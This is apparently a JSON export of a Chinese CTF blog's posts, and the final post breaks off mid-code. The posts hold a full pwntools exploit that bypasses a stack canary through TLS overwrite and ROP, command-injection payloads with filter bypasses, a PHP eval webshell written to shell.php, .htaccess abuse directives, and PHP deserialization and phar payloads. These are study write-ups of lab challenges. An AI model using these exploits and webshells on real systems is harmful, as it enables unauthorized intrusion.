{"pages":[],"posts":[{"title":"绕过Canary的其他姿势 StarCTF2018 baby_stack","text":"作者：LordRiot emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz orzStarCTF2018 baby_stack今天等修手机的时候想起昨天看到ichunqiu新春战役的BFnote里利用覆写TLS结构体bypass了canary，于是就很好奇其具体原理，查了一波发现，那一题是利用libc2.23的特殊机制覆写了main线程的TLS，然后找到另一个覆写TLS结构体的题，即是本题，不过不同的是，本题直接利用pthread_create函数，加了个线程出来，然后由于该线程的栈在其TLS结构体之上，所以可以覆写成功。 这一题是我知道原理之后纯动调做的orz，就先打个断点，康康canary的值，之后跟进，直接find canary，查到其在内存中的所有位置，发现有四处，其中一处是在main线程的TLS，两处是在新线程的栈，一处是在新线程的TLS结构，然后算出偏移，直接全部覆写成’\\x00’，然后由于改了TLS（TLS结构体里本身有些随机的量，例如一些在libc上的地址什么的，第一次覆写肯定无法保持，只能全覆写成0了），所以需要栈迁移一下，就read payload到新栈，然后劫持栈到新栈即可，然后似乎是由于payload长度的关系，我一度想写’/bin/sh\\x00’，然后call system来getshell，但是始终不行，动调了俩小时，毫无起色，甚至我都跟着system源码单步调试了，发现似乎是payload的某个地方的覆写导致的，然后换成了one_gadget，一梭搞定，orz，原地自闭，下面贴一下exp。（one_gadget 我直接用的本地的，是2.27的，打远程的话，第一次leak出版本再获取一样的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081p = process('./baby_stack')puts_plt = 0x4006F0read_got = 0x601FD0puts_got = 0x601FB0new_stack = 0x602400init_pop = 0x400B6Ainit_mov = 0x400B50pop_rdi = 0x400b73pop_rbp = 0x4007d8leave = 0x4008a6fake_canary = '\\x00' * 8first_offset = 0xB0second_offset = 0x820fake_TLS = p64(0x603270)fake_TLS += p64(0)fake_TLS += p64(1)fake_TLS += p64(0)fake_TLS += fake_canaryrop_chain = p64(init_pop)rop_chain += p64(0)rop_chain += p64(1)rop_chain += p64(read_got)rop_chain += p64(0)rop_chain += p64(new_stack)rop_chain += p64(0x400)rop_chain += p64(init_mov)rop_chain += '\\x00' * 0x38rop_chain += p64(pop_rbp)rop_chain += p64(new_stack - 8)rop_chain += p64(leave)payload = '\\x00' * 0x101bpayload += rop_chainpayload += '\\x00' * (second_offset - 16 - len(rop_chain))payload += fake_TLSp.recvuntil('How many bytes do you want to send?')p.send(str(len(payload)))sleep(1)p.send(payload)sleep(1)p.send('\\x00' * 3)rop_chain = p64(init_pop)rop_chain += p64(0)rop_chain += p64(1)rop_chain += p64(read_got)rop_chain += p64(0)rop_chain += p64(new_stack + 0x400)rop_chain += p64(0x400)rop_chain += p64(init_mov)rop_chain += '\\x00' * 0x38rop_chain += p64(pop_rbp)rop_chain += p64(new_stack + 0x400 - 8)rop_chain += p64(leave)payload = p64(pop_rdi)payload += p64(puts_got)payload += p64(puts_plt)payload += rop_chainp.recvuntil('It\\'s time to say goodbye.')p.send(payload)p.recvline()puts_addr = u64(p.recv(6).ljust(8, '\\x00'))obj = LibcSearcher('puts', puts_addr)base_addr = puts_addr - obj.dump('puts')one_gadget = 0x4f322 + base_addrsleep(1)p.send(p64(one_gadget))p.interactive() 本来还想水一期栈迁移和SROP的博客，但最近事情太多了，还要赶紧学堆，就先鸽了，以后有时间把return to VDSO和SROP一块写了: - )","link":"/2020/02/20/StarCTF2018%20baby_stack/"},{"title":"CTFhub RCE系列","text":"今天介绍远程执行漏洞（其实想学反弹shell。 首先需要掌握几种常见的语句。 1、| ，&amp; ，&amp;&amp;，||等操作 （1）&amp; 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 &amp; CMD2 （2）&amp;&amp; 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 &amp;&amp; CMD2 （3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2 2、payload（&amp; / ‘ “ 空格等特殊符号需要时编码） (1) cmd = 127.0.0.1 | whoami (2) cmd = 127.0.0.1 &amp; whoami (3) cmd = 127.0.0.1 &amp;&amp; whoami (4) cmd = `whoami` (5) cmd = &apos;/&quot;|whoami（这里意思是用&apos;/&quot;引号闭合前面 /-&gt;表示或） 3、常用的命令 （1） 有回显的：whoami id（验证类） (2) 没有回显的：nslookup wget 等看请求、dnslog httplog等 （验证类） （3）弹shell必须的，参考我自己的（http://www.cnblogs.com/KevinGeorge/p/8120226.html） ————————————————版权声明：本文为CSDN博主「iamsongyu」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/iamsongyu/article/details/84483638 第一关没有任何过滤127.0.0.1|ls127.0.0.1|cat ```.phpF12看源码。 第二关 过滤掉了cat还是先看127.0.0.1|ls127.0.0.1|c’a’t flag_110451125822562.phpF12出flag上述是一种方法还有一种可以传一句话木马 1127.0.0.1|echo &quot;&lt;?php @eval(\\$_POST['a']);?&gt;&quot; &gt;&gt; shell.php 连shell就不展示了 第三关 过滤空格127.0.0.1|ls我这里是运用了${IFS}来绕过了空格，我尝试了括号和url编码无果，考虑使用了${IFS} 1127.0.0.1|cat${IFS}flag_518528200601.php 依然F12看源码得到flag 第四关 过滤目录分隔符目录分割符通常是’'或者是’/‘两者在python中都可用。那么就用分号类似堆叠注入一样每个语句后加分号127.0.0.1;ls 1127.0.0.1;cd flag_is_here;ls 老套路 第五关 过滤运算符同上关就可。这让我想到了是不是上一关有其他方法。我去搜索了下。得到结果其他人也是这么做的。去搜索了有没有分号过滤以及绕过没有得到什么结果（以后填坑）第六关就填坑了。 第六关 以上所有关全部过滤难道不是第二关+第三关+第四关就结束了？好吧，看到题确实不是hhh。毕竟是最后一个了，给大家分析一下吧首先过滤了基本上面我所用过的所有命令分隔符。那么在这里介绍一下另外两种分隔符%0a(换行符) 、%0d(回车符)，并且在url下写入 1?ip=127.0.0.1%0Als# 注意只能在url写，否则会被二次编码导致失效。那么就继续下一步。 1ip=127.0.0.1%0acd${IFS}'f'lag_is_here%0als# 最后一把梭 1ip=127.0.0.1%0acd${IFS}'f'lag_is_here%0a'c'at${IFS}'f'lag_256432033625740.php# 到此就结束一段了23333","link":"/2020/03/18/ctfhub-RCE/"},{"title":"PHP积累","text":"php 三种写法1234567&lt;? echo (&quot;这是一个 PHP 语言的嵌入范例\\n&quot;); ?&gt;&lt;?php echo(&quot;这是第二个 PHP 语言的嵌入范例\\n&quot;); ?&gt;&lt;script language=&quot;php&quot;&gt; echo (&quot;这是类似 JavaScript 及 VBScript 语法的 PHP 语言嵌入范例&quot;);&lt;/script&gt;&lt;% echo (&quot;这是类似 ASP 嵌入语法的 PHP 范例&quot;); %&gt; php://filter简单理解： php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西； 使用不同的参数可以达到不同的目的和效果： 名称 描述 备注 resource=&lt;要过滤的数据流&gt; 指定了你要筛选过滤的数据流 必选 read=&lt;读链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符”|”分割 可选 write=&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符”|“分割 可选 &lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 反序列化魔术方法123456789__construct()//当一个对象创建时被调用__destruct() //当一个对象销毁时被调用__toString() //当一个对象被当作一个字符串使用__sleep()//在对象在被序列化之前运行__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)__get()//获得一个类的成员变量时调用__set()//设置一个类的成员变量时调用__invoke()//调用函数的方式调用一个对象时的回应方法__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数 public、protected与private在序列化时的区别protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\\0\\0的前缀。这里的 \\0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \\0 组合。这也许解释了，为什么如果直接在网址上，传递\\0\\0username会报错，因为实际上并不是\\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。 123456789101112131415161718&lt;?phpclass Name{ protected $username = 'nonono'; protected $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } public function __wakeup(){ $this-&gt;username = \"guests\"; } public function fun(){ echo $this-&gt;username;echo \"&lt;br&gt;\";echo $this-&gt;password; }}$a = serialize(new Name(\"admin\",100));echo $a;?&gt; 1O:4:&quot;Name&quot;:2:{s:11:&quot;\\0*\\0username&quot;;s:5:&quot;admin&quot;;s:11:&quot;\\0*\\0password&quot;;i:100;} private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀。字符串长度也包括所加前缀的长度。其中 \\0 字符也是计算长度的。 可以不看：这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。 12345678910111213141516171819&lt;?phpclass Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } public function __wakeup(){ $this-&gt;username = \"guests\"; } public function fun(){ echo $this-&gt;username;echo \"&lt;br&gt;\";echo $this-&gt;password; }}$a = serialize(new Name(\"admin\",100));echo $a;?&gt;O:4:\"Name\":2:{s:14:\"\\0Name\\0username\";s:5:\"admin\";s:14:\"\\0Name\\0password\";i:100;} 3.__wakeup()方法绕过作用：与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过__wakeup 函数的执行。上面的代码，序列化后的结果为 要求：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 1O:4:&quot;Name&quot;:2:{s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;} 其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()函数。 1O:4:&quot;Name&quot;:3:{s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;} .htaccess文件利用 正确解析绕过 .htaccess中出现的无法正常解析的条目时无法生效 \\换行绕过脏字符或绕WAF 利用XMP图片解析头(#刚好是注释符) 12#define width 1#define height 1 利用wbmp文件解析头 1\\x00\\x00\\x8a\\x39\\x8a\\x39 增加使用php解析的文件后缀(.jpg) 1AddType application/x-httpd-php .jpg 增加使用php解析的文件 123&lt;FilesMatch &quot;&lt;filename&gt;&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 利用php_value注入php配置 在所有php前后注入恶意php文件 12php_value auto_prepend_file &quot;&lt;FileDir&gt;&quot;php_value auto_append_file &quot;&lt;FileDir&gt;&quot; 利用prce参数绕过preg_match 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 任意匹配均返回FALSE https://www.php.net/manual/zh/pcre.configuration.php 利用UTF-7编码绕过日志html编码 12php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 利用inclue_path包含恶意文件 1php_value include_path &quot;/tmp&quot; 利用error log写本地文件 (html编码) 12php_value error_log /tmp/fl3g.phpphp_value error_reporting 32767","link":"/2020/03/18/php-bypass/"},{"title":"从两道题目浅谈PHP深浅拷贝","text":"0x01 前言最近才认认真真看完PHP，虽然还是有很多地方不会应用，因此想多看看有关PHP的题目，看到了两道和PHP深浅拷贝有关的题目，自己也把它搞懂吧。。 0x01 正文题一：南邮ctf的PHP反序列化 12345678910111213141516171819202122232425&lt;?phpclass just4fun { var $enter; var $secret;}if (isset($_GET['pass'])) { $pass = $_GET['pass']; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = \"*\"; if ($o-&gt;secret === $o-&gt;enter) echo \"Congratulation! Here is my secret: \".$o-&gt;secret; else echo \"Oh no... You can't fool me\"; } else echo \"are you trolling?\";}?&gt; 题目意图很简单，就是先设置了对象的一个属性的值，如果另一个属性的值和这个设置好的值相等，则得到flag，而get_magic_quotes_gpc()和$pass=stripslashes($pass)只是把加上的转义字符又给去掉，似乎对这个题没有什么影响。最初我以为$o-&gt;secret = &quot;*&quot;就是把这个属性的值设为*，其实是设置成了任意字符，那我们如何将这个满足$o-&gt;secret === $o-&gt;enter这里就要用到PHP深浅拷贝的知识。 我们举一个栗子： 123456789101112131415&lt;?phpclass Example1{ public $name; public function __construct($name) { $this-&gt;name = $name; }}$ex1 = new Example('test1');// $ex1-&gt;name现在是：test1$ex2 = $ex1;// $ex2-&gt;name现在是：test1$ex2-&gt;name = 'test2';// 这样修改一下之后，$ex1-&gt;name与$ex2-&gt;name都变为了：test2 现在我们应该可以理解对象间引用的概念，他们就相当于是同一个类的同一个对象，PHP5默认通过引用传递对象，假设$obj1和$obj2是两个对象，使用$obj1=$obj2这样的方法复制出的对象是相互关联的，程序中想复制一个值与原来相同的对象，而不希望目标对象与源对象关联，应使用clone关键字。 123$ex1 = new Example('test1');// $ex1-&gt;name现在是：test1$ex2 = clone $ex1;//$ex2-&gt;name现在是：test1$ex2-&gt;name = 'test2';//现在$ex1-&gt;name还是test1,而$ex2-&gt;name是test2 这里看到，通过clone之后，$ex1与$ex2是两个不同的对象，他们拥有各自的变量环境。但是这里需要注意，在这两个对象内部，拥有的是值类型的数据，如果是内部拥有的是引用类型，那么通过clone得到的新对象中的引用则仍然指向原引用 因此这里就引申出 浅复制 与 深复制 的概念： 浅复制： 使用clone来复制对象，这种复制叫做“浅复制“，被赋值对象的所有变量都还有与原来对象相同的值，而所有的对其他对象的引用都仍然指向原来的对象。深复制：被复制的对象的所有的变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。 而如果要进行深复制，应该在类中定义一个__clone()方法,在这个方法中完成对目标对象的属性赋以新值，这里就不过多赘述。 或者利用串行化(冷藏与解冻)，即序列化再反序列化： 12$tmp = serialize($ex1);$ex2 = unserialize($tmp); 这样得到的$ex2就是一个全新的对象 最后要引出&amp;，属于浅拷贝，举个例子就能明白了： 12345&lt;?php$a = 'crispr';$b = &amp;$a;$b = 'crispr copy';echo $a; //此时$a = 'crispr copy' 类似传地址过去，其实它们的改变是完全同步的，或者说它们就是一体的。 因此PHP生成的POC如下: 1234567891011121314&lt;?php class just4fun { var $enter; var $secret; function __construct() { $this-&gt;enter=&amp;$this-&gt;secret; //浅拷贝，它们的变化完全同步 } } echo serialize(new just4fun()); ?&gt; 题二： 2019全国信息安全大赛 JustSoSo 这里我是本地进行复现的，23333，只能分析一下PHP了和构造Poc，其他的文件包含读PHP就省去了。。。 hint.php 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php class Handle{ private $handle; public function __wakeup(){foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo \"Waking up\\n\"; }public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){$this-&gt;handle-&gt;getFlag();}}class Flag{ public $file; public $token; public $token_flag; function __construct($file){$this-&gt;file = $file;$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); }public function getFlag(){$this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag){if(isset($this-&gt;file)){echo @highlight_file($this-&gt;file,true); } } }}?&gt; index.php 123456789101112131415161718192021222324252627282930&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"];if(!isset($file)){echo 'Missing parameter'.'&lt;br&gt;';}if(preg_match(\"/flag/\",$file)){die('hack attacked!!!');}@include($file);if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload);}else{ echo \"Missing parameters\"; } ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt; 通过GET获取两个参数：file和payload。Hint.php中有两个类Flag和Handle。主要是通过Handle来调用Flag的getFlag()函数。但在Handle中存在wakeup()函数，该函数会重置所有变量，导致传入的Flag类对象为空。这里可以利用增加对象个数的方式来绕过wakeup函数，增加对象个数时wakeup函数便会失效，这个是比较常见的。还要绕过一层： 123456789101112 function __construct($file){$this-&gt;file = $file;$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); }public function getFlag(){$this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag){if(isset($this-&gt;file)){echo @highlight_file($this-&gt;file,true); } 这里我们的$file是flag.php，而初始化后，$this-&gt;token_flag = $this-&gt;token，接着调用getFlag()方法后，重新设置了$this-&gt;token_flag，因此在这里也应该是要使用&amp;符号，令$this-&gt;token_flag = &amp;$this-&gt;token进行浅拷贝。 1234567if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); 此时还需要绕过?payload=不能出现flag,但是flag在flag.php中，在url多加斜杠即可,///index.php?此时PHP便不会解析成功了。最终PHP的Poc如下: 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Handle{ private $handle; public function __wakeup(){foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo \"Waking up\\n\"; }public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag();}}class Flag{ public $file; public $token; public $token_flag; function __construct($file){$this-&gt;file = $file;$this-&gt;token_flag = &amp;$this-&gt;token;}} $o = new Flag('flag.php');$oo = new Handle($o);$ser = serialize($oo);print $ser;?&gt; 最终payload:///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}} 注意Handle有私有变量，应该加上%00","link":"/2020/03/18/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88PHP%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/"},{"title":"文件上传","text":"CTFhub 文件上传一般所看到的文件上传，除了连🐎那就是通过htaccess来更改php.ini的配置。而也存在是利用上传点进行php反序列化漏洞或是其他的注入。本文主要进行CTFhub上文件上传题的复现。当然可以传一些RCE但是就反而复杂了，直接传🐎就可以更简单一些 第一题无任何过滤。上传一个php文件包含一句话木🐎 第二题前端认证抓包改包传就可以了。蚁剑连上 .htaccess文件上传这个是比较特别的一种解析错误 htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 那么还是先看题目吧基本过滤了所有的文件类型，唯独.htaccess没有。那么上传这个文件能够得到什么仔细看过之后，发现jpg还是可以用的。那么考虑还是传jpg并且用htaccess让服务器解析jpg转换为解析jpg的格式 1payload:AddType application/x-httpd-php .jpg 剩下的就传一个带🐎的jpg即可得到了flag. MIME验证 MIME:客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。也就是服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。那就好办了，不管我上传什么类型的文件，我只要修改Content-Type字段来让检测通过就行了。作者：Maxx_FAN链接：https://www.jianshu.com/p/01c1d5f05852来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 那和第二个就没啥区别了。。。只需要抓包改包。不多介绍了 文件头检查所谓的文件头我在misc的介绍中讲过了，也就是16进制下每个文件固有的东西。那么我们可以通过编辑整个图片，把一句换木马夹在里面。这样检验文件头也就自然没用了。抓包改后缀以及图片末尾 那么就可以上传getshell了。 %00截断绕过这个是一个耳熟能详的方法了。我想先给大家介绍下原理： 0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。 也同样有限制条件 PHP&lt;5.3.29，且GPC关闭GPC功能之一就是检查%00被错误认知的情况。所以需要关闭。 1admin.php%00;a.jpg 原来我也是单纯的认为在文件名处进行截断，如xx.php%00.jpg，这样其实是不对的，提取的时候碰到%00就会认为字符串提取结束了，后面的.jpg就不会再提取，那样的效果还是等于上传了.php的文件，无法绕过。正确的做法还是数据包中必须有上传文件的path才行。结合上传路径+文件名，进行截断。 但是这道题如果直接传的话会变成rand。无法找到文件，所以需要再次截断。然后getshell就可以了 双写绕过题如其名改成.pphphp就行传马连上就成了。就结束了","link":"/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"从反序列化、POP链看PHP代码审计","text":"很长时间为php反序列化和pop链的各种题目所困惑，一直想系统地总结和巩固一下，于是就有了本文。文章以POP链、反序列化为切入点，希望详细论述一些代码审计的方法论。 先放上全文思路图 主要内容分为三个部分： 前置知识补漏 漏洞利用链方法论 实践工具和技巧 基础知识参考文章 比较全面且基础的文章 且讲解了session的序列化器不同引发的漏洞 从LCTF WEB签到题看PHP反序列化 php反序列化pop链一则 比较困难的部分是实际的CMS审计 Thinkphp 5.1.反序列化漏洞详解 前置知识序列化和序列化为了传输对象，我们把类变成一个有结构的字符串，就称为序列化。把这个字符串变为原来的对象，就称为反序列化。我们只能保存对象的属性，而不能保存对象的方法。 为了能够unserialize()一个对象，这个对象的类必须已经定义过，传统编程需要很多include和require。后来出现了autoloading技术，自动导入使用的类。 要提一下Composer,这是一个php的包管理工具,同时他还能自动导入依赖库中定义的类。这样一来 unserialize() 函数也就能使用所有依赖库中的类了,攻击面增大不少。 Composer配置的依赖库存储在vendor目录下 如果要使用Composer的自动类加载机制,只需要在php文件的开头加上require DIR . '/vendor/autoload.php'; 反序列化的漏洞：CVE-2016-7124 触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。当序列化字符串中表示对象个数的值大于真实的属性个数时，会跳过__wakeup()的执行。 魔术方法魔术方法是在一定情况下会被类自动调用的方法。我们经常通过控制属性，到达一些魔术方法，进而一步步到达漏洞函数。下面列出了方法和被调用的时机 1234567891011__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问(不存在)的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 Phar参考资料： phar详解+稍复杂利用实例 from seebug PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。phar文件会以序列化的形式存储用户自定义的meta-data，这使得文件函数读取phar格式的文件时，就会触发unserialize。这样子我们就相当于利用好多文件操作函数，达到了unserialize函数的目的。下面是受到影响的文件操作函数，非常多。 但phar也有利用的条件： phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 下面简单介绍Phar格式的结构： 四部分。首先是标志位：格式为xxx，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。前面内容不限，因此我们经常可以文件头伪造。 接下来是menifest，phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 再接下是被压缩文件的内容，无关紧要。 最后是签名，放在文件末尾。 生成phar文件的脚本： 123456789101112131415161718192021&lt;?php class MyObject { //你的逻辑 } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub /* $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER();?&gt;\"); 这样也完全没问题 */ $o = new MyObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件，注意！不添加会导致无法生成phar //签名自动计算 $phar-&gt;stopBuffering();?&gt; 调用也很容易 12$filename = 'phar://phar.phar/a_random_string'; file_exists($filename);//文件函数即可 命名空间在通常的PHP开发中，除了使用自己的代码以外，往往会使用很多其他的PHP组件。这些组件代码可能会使用相同的类名、接口名、函数或者常量名等，如果不使用命名空间就会导致命名冲突，使PHP执行出错。而将代码放到各自唯一的命名空间中，我们的代码就可以和其他开发者使用相同的类名、接口名、函数或者常量名等。 我们只要知道，在构造利用类时，顺便加上它所在的命名空间就好了。 12&lt;?phpnamespace mainspace/subspace; 还要注意的是，在命名空间中使用全局类，需要在类名前加上/符，否则会出错。 123456789&lt;?phpnamespace A\\B\\C;class Exception extends \\Exception {}$a = new Exception('hi'); // $a 是类 A\\B\\C\\Exception 的一个对象$b = new \\Exception('hi'); // $b 是类 Exception 的一个对象$c = new ArrayObject; // 致命错误, 找不到 A\\B\\C\\ArrayObject 类?&gt; 漏洞利用链方法论先阐述很重要的POP链利用，然后介绍一般的漏洞利用方法。 POP链实例如果直接介绍POP链的定义，相信会很抽象，很难理解。我们先通过简单的例子感性认识一下 1234567891011121314151617181920&lt;?phpclass User{ public $name; function __destruct(){ if($this-&gt;name == \"admin\"){ echo \"\\nflag{This_is_flag}\"; } }}class Group{ public $user; //...}class Coll{ public $group; //...}?&gt; 这是三个类的定义，它们是递进依赖的关系。接下来在代码中添加以下几行 12345678910//声明$c = new User();$b = new Group();$a = new Coll();//利用$c-&gt;name = \"admin\";$b-&gt;user = $c;$a-&gt;group = $b;//获得expecho serialize($a); 输出了O:4:&quot;Coll&quot;:1:{s:5:&quot;group&quot;;O:5:&quot;Group&quot;:1:{s:4:&quot;user&quot;;O:4:&quot;User&quot;:1:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;}}}和应有的flag（因为执行完脚本自动destruct）。而如果转而添加以下几行 12$string = 'O:4:\"Coll\":1:{s:5:\"group\";O:5:\"Group\":1:{s:4:\"user\";O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}}}';$Coll = unserialize($string); 也可以得到flag，这就是一次简单的POP链利用过程了。 POP链POP是面向属性编程的意思。在以上操作中，我们利用unserialize函数，控制了一些相互依赖的对象的属性。 unserialize函数上面已经讲过了，它的本质是：控制了对象的所有属性，即使这个属性是另一个对象，也可以控制。 为了做到控制某个属性，控制了一层又一层的对象，连起来像链条一样。就如上例，我们意图是控制name，为了演示，通过Coll-&gt;Group-&gt;User-&gt;name进行了控制。这就是POP链的构造。其实很简单。 相同函数名的漏洞利用这是一个扩展利用链的方法。 有时候漏洞函数在一个类的普通方法中，我们正常是做不到以可控变量访问此方法的。这个时候我们可以通过可以控制的类，与漏洞函数所在方法同名的方法来执行。例子如下 12345678910111213141516171819202122232425&lt;?phpclass Main{ public $classObj; function __construct(){ $this-&gt;classObj = new Accessable(); } function __destruct(){ $this-&gt;classObj-&gt;action(); }}class NotAccessable{ function action(){ echo \"flag{this_is_flag}\"; }}class Accessable{ function action(){ echo \"flag is not here\"; }}?&gt; 注意到action方法重名，可以构造exp 123456789101112131415&lt;?phpclass Main{ public $classObj; function __construct(){ $this-&gt;classObj = new NotAccessable(); }}class NotAccessable{}$str = serialize(new Main());echo $str;// O:4:\"Main\":1:{s:8:\"classObj\";O:13:\"NotAccessable\":0:{}}?&gt; 可以看到成功执行。 利用链在代码审计的过程中，我们穿越在复杂的逻辑迷宫里。当我们发现了漏洞函数，一点点的观察：哪里调用了这个函数？可不可以最终控制函数的参数？一点点地溯源下去，最终发现了我们可以控制的输入点。在此过程中，用到的函数层层调用像链条一样连接起来，便是利用链。 我认为利用链有三要素：可控点，中间过滤，利用点。 可控点和利用点都很容易理解，重要的是中间过滤，我们常常需要把这些过滤记下来，在可控点进行bypass。利用点决定了我们能做什么，中间过滤决定了要怎么做，而可控点则是点出了我们在哪做。实际操作的时候，我们只要明确这三个问题，就不会迷失方向。 实践与技巧如果利用链可以从谁能调用我？和我能调用谁？两个角度出发，从后往前+从前往后一起遍历，最后中间相遇。 审计CMS时，则往往是从类中寻找可以利用的漏洞，然后直接全局寻找能够触发unserialize的代码。 中规中矩的题目12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php//flag is in flag.phperror_reporting(1);class Read { public $var; public function file_get($value) { $text = base64_encode(file_get_contents($value));//[TARGET 1] return $text; } public function __invoke(){ $content = $this-&gt;file_get($this-&gt;var); echo $content; }}class Show{ public $source; public $str; public function __construct($file='index.php') { $this-&gt;source = $file; echo $this-&gt;source.'Welcome'.\"&lt;br&gt;\"; } public function __toString() { return $this-&gt;str['str']-&gt;source; } public function _show() { if(preg_match('/gopher|http|ftp|https|dict|\\.\\.|flag|file/i',$this-&gt;source)) { die('hacker'); } else { highlight_file($this-&gt;source); //[TARGET 2] } } public function __wakeup() { if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } }}class Test{ public $p; public function __construct() { $this-&gt;p = array(); } public function __get($key) { $function = 